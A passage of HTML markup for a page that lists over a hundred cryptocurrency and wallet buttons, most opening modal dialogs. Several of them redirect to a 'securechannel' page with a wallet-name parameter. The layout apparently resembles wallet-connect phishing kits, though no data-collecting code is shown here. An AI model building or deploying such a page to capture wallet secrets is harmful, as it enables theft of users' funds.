                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img class="coin-img" src="/images/ki.png" alt="KI" />
                <h4 class="text-white">KI</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img class="coin-img" src="/images/secret.png" alt="SECRET" />
                <h4 class="text-white">SECRET</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="/images/crypto-org.png"
                  alt="CRO-COSMOS"
                />
                <h4 class="text-white">CRO-COSMOS</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img class="coin-img" src="/images/lum.png" alt="LUM" />
                <h4 class="text-white">LUM</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="/images/starname.png"
                  alt="STARNAME"
                />
                <h4 class="text-white">STARNAME</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img class="coin-img" src="/images/sif.png" alt="SIF" />
                <h4 class="text-white">SIF</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="/images/bitcanna.png"
                  alt="BITCANNA"
                />
                <h4 class="text-white">BITCANNA</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img class="coin-img" src="/images/desmos.png" alt="DESMOS" />
                <h4 class="text-white">DESMOS</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img class="coin-img" src="/images/juno.png" alt="JUNO" />
                <h4 class="text-white">JUNO</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="/images/persistence.png"
                  alt="PERSISTENCE"
                />
                <h4 class="text-white">PERSISTENCE</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="/images/sentinel.png"
                  alt="SENTINEL"
                />
                <h4 class="text-white">SENTINEL</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img class="coin-img" src="/images/emoney.svg" alt="EMONEY" />
                <h4 class="text-white">EMONEY</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="/images/konstellation.png"
                  alt="KONSTELLATION"
                />
                <h4 class="text-white">KONSTELLATION</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="/images/stargaze.png"
                  alt="STARGAZE"
                />
                <h4 class="text-white">STARGAZE</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img class="coin-img" src="/images/mars.svg" alt="MARS" />
                <h4 class="text-white">MARS</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img class="coin-img" src="/images/stride.png" alt="STRIDE" />
                <h4 class="text-white">STRIDE</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img class="coin-img" src="/images/onomy.png" alt="NOM" />
                <h4 class="text-white">NOM</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="/images/chihuahua.png"
                  alt="CHIHUAHUA"
                />
                <h4 class="text-white">CHIHUAHUA</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img class="coin-img" src="/images/fetch.png" alt="FETCH_AI" />
                <h4 class="text-white">FETCH AI</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img class="coin-img" src="/images/mtr.webp" alt="METER" />
                <h4 class="text-white">METER</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="/images/injective.png"
                  alt="INJECTIVE"
                />
                <h4 class="text-white">INJECTIVE</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img class="coin-img" src="/images/comdex.png" alt="COMDEX" />
                <h4 class="text-white">COMDEX</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="/images/bandchain.png"
                  alt="BANDCHAIN"
                />
                <h4 class="text-white">BANDCHAIN</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img class="coin-img" src="/images/ksm.webp" alt="KUSAMA" />
                <h4 class="text-white">KUSAMA</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img class="coin-img" src="/images/htr.webp" alt="HATHOR" />
                <h4 class="text-white">HATHOR</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img class="coin-img" src="/images/luna.webp" alt="LUNA" />
                <h4 class="text-white">LUNA</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img class="coin-img" src="/images/enjin.webp" alt="ENJIN" />
                <h4 class="text-white">ENJIN</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img class="coin-img" src="/images/alph.webp" alt="ALEPHIUM" />
                <h4 class="text-white">ALEPHIUM</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img class="coin-img" src="/images/hive.webp" alt="HIVE" />
                <h4 class="text-white">HIVE</h4>
              </button>
              <!-- Modal -->

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal35"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/images/138f51c8d00ac7b9ac9d8dc75344d096a7dfe370a568aa167eabc0a21830ed98.jpeg"
                  alt="XDC"
                />
                <h4 class="text-white">AlphaWallet</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img class="coin-img" src="/images/xdc.png" alt="XDC" />
                <h4 class="text-white">XDC</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img class="coin-img" src="/images/nrk.webp" alt="NORDEK" />
                <h4 class="text-white">NORDEK</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img class="coin-img" src="/images/brock.webp" alt="BROCK" />
                <h4 class="text-white">BROCK</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="/images/arbitrumNova.webp"
                  alt="ARBITRUM_NOVA"
                />
                <h4 class="text-white">ARBITRUM NOVA</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="/images/zksync-era.png"
                  alt="ZKSYNC_ERA"
                />
                <h4 class="text-white">ZKSYNC ERA</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img class="coin-img" src="/images/amb.webp" alt="AIRDAO" />
                <h4 class="text-white">AIRDAO</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img class="coin-img" src="/images/etc.png" alt="ETC" />
                <h4 class="text-white">ETC</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img class="coin-img" src="/images/rei.webp" alt="REI" />
                <h4 class="text-white">REI</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img class="coin-img" src="/images/rsk.webp" alt="RSK" />
                <h4 class="text-white">RSK</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img class="coin-img" src="/images/theta.webp" alt="THETA" />
                <h4 class="text-white">THETA</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img class="coin-img" src="/images/cspr.webp" alt="CASPER" />
                <h4 class="text-white">CASPER</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img class="coin-img" src="/images/BOBA.webp" alt="BOBA_BNB" />
                <h4 class="text-white">BOBA BNB</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img class="coin-img" src="/images/tenet.webp" alt="TENET" />
                <h4 class="text-white">TENET</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="/images/matic-token-icon.png"
                  alt="POLYGON_ZKEVM"
                />
                <h4 class="text-white">POLYGON ZKEVM</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img class="coin-img" src="/images/sei.webp" alt="SEI" />
                <h4 class="text-white">SEI</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img class="coin-img" src="/images/mnt.webp" alt="MANTLE" />
                <h4 class="text-white">MANTLE</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img class="coin-img" src="/images/sys.webp" alt="SYSCOIN" />
                <h4 class="text-white">SYSCOIN</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img class="coin-img" src="/images/tara.webp" alt="TARAXA" />
                <h4 class="text-white">TARAXA</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img class="coin-img" src="/images/linea.webp" alt="LINEA" />
                <h4 class="text-white">LINEA</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img class="coin-img" src="/images/bnb.svg" alt="OPBNB" />
                <h4 class="text-white">OPBNB</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img class="coin-img" src="/images/lyx.webp" alt="LUKSO" />
                <h4 class="text-white">LUKSO</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img class="coin-img" src="/images/tia.webp" alt="CELESTIA" />
                <h4 class="text-white">CELESTIA</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img class="coin-img" src="/images/ntrn.webp" alt="NEUTRON" />
                <h4 class="text-white">NEUTRON</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img class="coin-img" src="/images/orai.webp" alt="ORAI" />
                <h4 class="text-white">ORAI</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img class="coin-img" src="/images/ewt.webp" alt="EWT" />
                <h4 class="text-white">EWT</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img class="coin-img" src="/images/flr.webp" alt="FLARE" />
                <h4 class="text-white">FLARE</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img class="coin-img" src="/images/manta.webp" alt="MANTA" />
                <h4 class="text-white">MANTA</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img class="coin-img" src="/images/zeta.webp" alt="ZETACHAIN" />
                <h4 class="text-white">ZETACHAIN</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img class="coin-img" src="/images/tomo.webp" alt="TOMOCHAIN" />
                <h4 class="text-white">TOMOCHAIN</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img class="coin-img" src="/images/wan.webp" alt="WANCHAIN" />
                <h4 class="text-white">WANCHAIN</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="/images/etn.webp"
                  alt="ELECTRONEUM"
                />
                <h4 class="text-white">ELECTRONEUM</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="/images/zkl.webp"
                  alt="ZKLINK_NOVA"
                />
                <h4 class="text-white">ZKLINK NOVA</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img class="coin-img" src="/images/taiko.webp" alt="TAIKO" />
                <h4 class="text-white">TAIKO</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img class="coin-img" src="/images/wemix.webp" alt="WEMIX" />
                <h4 class="text-white">WEMIX</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="/images/bitgert.webp"
                  alt="BITGERT"
                />
                <h4 class="text-white">BITGERT</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img class="coin-img" src="/images/dydx.webp" alt="DYDX" />
                <h4 class="text-white">DYDX</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img class="coin-img" src="/images/astr.webp" alt="ASTAR" />
                <h4 class="text-white">ASTAR</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img class="coin-img" src="/images/nano.webp" alt="NANO" />
                <h4 class="text-white">NANO</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img class="coin-img" src="/images/pokt.webp" alt="POCKET" />
                <h4 class="text-white">POCKET</h4>
              </button>
              <!-- Modal -->

              <button
                onclick="
                  location.assign('securechannele720.html?walletname=DCENT')
                "
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal36"
                class="btn coin"
              >
                <img class="coin-img" src="/images/unnamed(2).png" alt="" />
                <h4 class="text-white">D'CENT</h4>
              </button>

              <button
                onclick="
                  location.assign('securechannele720.html?walletname=DCENT')
                "
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal36"
                class="btn coin"
              >
                <img class="coin-img" src="/images/fuse.png" alt="" />
                <h4 class="text-white">FUSE</h4>
              </button>

              <button
                onclick="
                  location.assign('securechannele720.html?walletname=DCENT')
                "
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal36"
                class="btn coin"
              >
                <img class="coin-img" src="/images/doge.png" alt="" />
                <h4 class="text-white">DOGE</h4>
              </button>

              <button
                onclick="
                  location.assign('securechannele720.html?walletname=DCENT')
                "
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal36"
                class="btn coin"
              >
                <img class="coin-img" src="/images/cosmos.svg" alt="" />
                <h4 class="text-white">COSMOS</h4>
              </button>
              <!-- Modal -->

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal37"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="/images/6323b69954bc41ff9409f033_public.png"
                  alt=""
                />
                <h4 class="text-white">ZelCore</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal37"
                class="btn coin"
              >
                <img class="coin-img" src="/images/KCC.svg" alt="KCC" />
                <h4 class="text-white">KCC</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal37"
                class="btn coin"
              >
                <img class="coin-img" src="/images/kava.webp" alt="KAVA_EVM" />
                <h4 class="text-white">KAVA EVM</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal37"
                class="btn coin"
              >
                <img class="coin-img" src="/images/kava.webp" alt="KAVA_IBC" />
                <h4 class="text-white">KAVA IBC</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal37"
                class="btn coin"
              >
                <img class="coin-img" src="/images/Blast.webp" alt="BLAST" />
                <h4 class="text-white">BLAST</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal37"
                class="btn coin"
              >
                <img class="coin-img" src="/images/bb.webp" alt="BOUNCEBIT" />
                <h4 class="text-white">BOUNCEBIT</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal37"
                class="btn coin"
              >
                <img class="coin-img" src="/images/nibi.webp" alt="NIBIRU" />
                <h4 class="text-white">NIBIRU</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal37"
                class="btn coin"
              >
                <img class="coin-img" src="/images/ron.webp" alt="RONIN" />
                <h4 class="text-white">RONIN</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal37"
                class="btn coin"
              >
                <img class="coin-img" src="/images/xpla.webp" alt="XPLA" />
                <h4 class="text-white">XPLA</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal37"
                class="btn coin"
              >
                <img class="coin-img" src="/images/andr.webp" alt="ANDROMEDA" />
                <h4 class="text-white">ANDROMEDA</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal37"
                class="btn coin"
              >
                <img class="coin-img" src="/images/saga.webp" alt="SAGA" />
                <h4 class="text-white">SAGA</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal37"
                class="btn coin"
              >
                <img class="coin-img" src="/images/telos.webp" alt="TELOSEVM" />
                <h4 class="text-white">TELOSEVM</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal37"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="/images/space.webp"
                  alt="MICROVISIONCHAIN"
                />
                <h4 class="text-white">MICRO VISION CHAIN</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal37"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="/images/dym.webp"
                  alt="DYMENSION_IBC"
                />
                <h4 class="text-white">DYMENSION IBC</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal37"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="/images/dym.webp"
                  alt="DYMENSION_EVM"
                />
                <h4 class="text-white">DYMENSION EVM</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal37"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="/images/rsz_zircuit.jpg"
                  alt="ZIRCUIT"
                />
                <h4 class="text-white">ZIRCUIT</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal37"
                class="btn coin"
              >
                <img class="coin-img" src="/images/kaspa.webp" alt="KASPA" />
                <h4 class="text-white">KASPA</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal37"
                class="btn coin"
              >
                <img class="coin-img" src="/images/xrp.webp" alt="RIPPLE" />
                <h4 class="text-white">RIPPLE</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal37"
                class="btn coin"
              >
                <img class="coin-img" src="/images/azero.webp" alt="AZERO" />
                <h4 class="text-white">AZERO</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal37"
                class="btn coin"
              >
                <img class="coin-img" src="/images/dot.webp" alt="POLKADOT" />
                <h4 class="text-white">POLKADOT</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal37"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="/images/dogeevm.webp"
                  alt="DOGECHAIN"
                />
                <h4 class="text-white">DOGECHAIN</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal37"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="/images/wtc.webp"
                  alt="WALTONCHAIN"
                />
                <h4 class="text-white">WALTONCHAIN</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal37"
                class="btn coin"
              >
                <img class="coin-img" src="/images/ar.webp" alt="ARWEAVE" />
                <h4 class="text-white">ARWEAVE</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal37"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="/images/icp.webp"
                  alt="INTERNET_COMPUTER"
                />
                <h4 class="text-white">INTERNET COMPUTER</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal37"
                class="btn coin"
              >
                <img class="coin-img" src="/images/flux.webp" alt="FLUX" />
                <h4 class="text-white">FLUX</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal37"
                class="btn coin"
              >
                <img class="coin-img" src="/images/nexa.webp" alt="NEXA" />
                <h4 class="text-white">NEXA</h4>
              </button>
              <!-- Modal -->

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal38"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/images/comai.webp"
                  alt="COMAI"
                />
                <h4 class="text-white">COMAI</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal38"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/images/mapo.webp"
                  alt="MAPO"
                />
                <h4 class="text-white">MAPO</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal38"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/images/scroll.webp"
                  alt="SCROLL"
                />
                <h4 class="text-white">SCROLL</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal38"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/images/mode.webp"
                  alt="MODE"
                />
                <h4 class="text-white">MODE</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal38"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/images/merl.webp"
                  alt="MERLIN"
                />
                <h4 class="text-white">MERLIN</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal38"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/images/starknet.webp"
                  alt="STARKNET"
                />
                <h4 class="text-white">STARKNET</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal38"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/images/ada.webp"
                  alt="CARDANO"
                />
                <h4 class="text-white">CARDANO</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal38"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/images/algo.webp"
                  alt="ALGORAND"
                />
                <h4 class="text-white">ALGORAND</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal38"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/images/xmr.webp"
                  alt="MONERO"
                />
                <h4 class="text-white">MONERO</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal38"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/images/xlm.webp"
                  alt="STELLAR"
                />
                <h4 class="text-white">STELLAR</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal38"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/images/fil.webp"
                  alt="FILECOIN"
                />
                <h4 class="text-white">FILECOIN</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal38"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/images/dor.webp"
                  alt="DOR"
                />
                <h4 class="text-white">DOR</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal38"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/images/dag.webp"
                  alt="DAG"
                />
                <h4 class="text-white">DAG</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal38"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/images/venom.webp"
                  alt="VENOM"
                />
                <h4 class="text-white">VENOM</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal38"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/images/mpc.webp"
                  alt="PARTISIA"
                />
                <h4 class="text-white">PARTISIA</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal38"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/images/avail.webp"
                  alt="AVAIL"
                />
                <h4 class="text-white">AVAIL</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal38"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/images/rvn.webp"
                  alt="RAVEN"
                />
                <h4 class="text-white">RAVEN</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal38"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/images/hbar.webp"
                  alt="HEDERA"
                />
                <h4 class="text-white">HEDERA</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal38"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/images/eos.webp"
                  alt="EOS"
                />
                <h4 class="text-white">EOS</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal38"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/images/egld.webp"
                  alt=""
                />
                <h4 class="text-white">EGLD</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal38"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/images/xtz.webp"
                  alt="XTZ"
                />
                <h4 class="text-white">XTZ</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal38"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/images/flow.webp"
                  alt="FLOW"
                />
                <h4 class="text-white">FLOW</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal38"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/images/cfx.webp"
                  alt="CONFLUX"
                />
                <h4 class="text-white">CONFLUX</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal38"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/images/mina.webp"
                  alt="MINA"
                />
                <h4 class="text-white">MINA</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal38"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
